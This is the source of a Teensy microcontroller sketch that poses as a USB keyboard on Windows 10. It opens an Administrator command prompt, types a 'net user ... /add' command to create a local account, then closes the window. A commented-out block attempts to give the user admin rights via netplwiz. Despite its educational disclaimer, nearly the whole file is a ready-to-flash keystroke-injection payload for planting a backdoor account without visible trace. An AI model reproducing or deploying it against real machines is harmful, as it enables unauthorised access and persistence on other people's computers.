/* @Author: AndreiMsc
 * @Date: 16/Nov/2016
 */
 /* This application is developed and tested on the Teensy 3.6 microcontroller, on Windows 10, under "Serial + Keyboard + Mouse + Joystick" usb type.
  * Its purpose is to add an user in a short time. It can be used with various purposes including security tests. After user-adding procces is finished, it closes the windows it used).
  * This application is for educational purpose and it acts like an example of Teensy usage.
  */
  //Disclaimer: I do not encourage the misusage of the application. Do not use this on other people's PCs because it would be illegal. The code was developed ONLY FOR EDUCATIONAL PURPOSE and TO SERVE AS AN EXAMPLE of what you can do with Teensy ON YOUR OWN PC. 


void setup(){

/*  CommandAtRunBarMSWIN("netplwiz"); 
  delay(5000);
  Keyboard.set_key1(KEY_TAB);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_TAB);
  delay(5000);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_TAB);
  delay(5000);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_ENTER);
  delay(5000);
  Keyboard.send_now();
  delay(5000);
  Keyboard.set_key1(KEY_TAB);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_TAB);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_TAB);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_TAB);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_TAB);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_RIGHT);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_TAB);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_TAB);                                                                        
  Keyboard.send_now();
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  All of the above had the purpose to give admin rights to the current user - Not necessary, not complete. I repeat you shall use this application only if you already have admin right, so only if you are the admin.*/

  delay(1000);      //The start is delayed so that the Teensy can make proper connection with the device it is use on.
  
 
  const int ledPin = 13;      //We assign the led to the pin 13.
      // Teensy 2.0 has the LED on pin 11
      // Teensy++ 2.0 has the LED on pin 6
      // Teensy 3.x / Teensy LC have the LED on pin 13
  pinMode(ledPin, OUTPUT);
  
  digitalWrite(ledPin, HIGH);      //The mounted led starts to signal that Teensy connected to the devicey.
  
  delay(2000);      //The actions are delayed so that a quick refresh is made automaticaly by windows, the Teensy program will not be disturbed.
  
  digitalWrite(ledPin, LOW);     //The mounted led stops. 
  
  //We access the Administrator:Command Promt. Normal Command Promt doesn't allow adding or removing a user.
  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_X);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_A);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  delay(1000);
  Keyboard.set_key1(KEY_LEFT);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_ENTER);
  delay(1000);
  Keyboard.send_now();
  delay(1500);
  
  //The user is added and a password is assigned to it. Change 'user' and 'password' with you wanted credentials.
  Keyboard.print("net user username password /add"); 
  delay(500);
  Keyboard.print("net user username password /add");      //for whatever reason, we have to print this 2 time so that it is actually typed into cmd
  Keyboard.set_key1(KEY_ENTER);
  delay(500);
  Keyboard.send_now();
  Keyboard.print('Y');
  delay(500);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  delay(500);

  //The command promt window will be closed.
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_F4);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();

// This is version 1.0 of the project.

}
/* You only add an user with the given name once, so no loop is implemented. */
void loop(){
}



















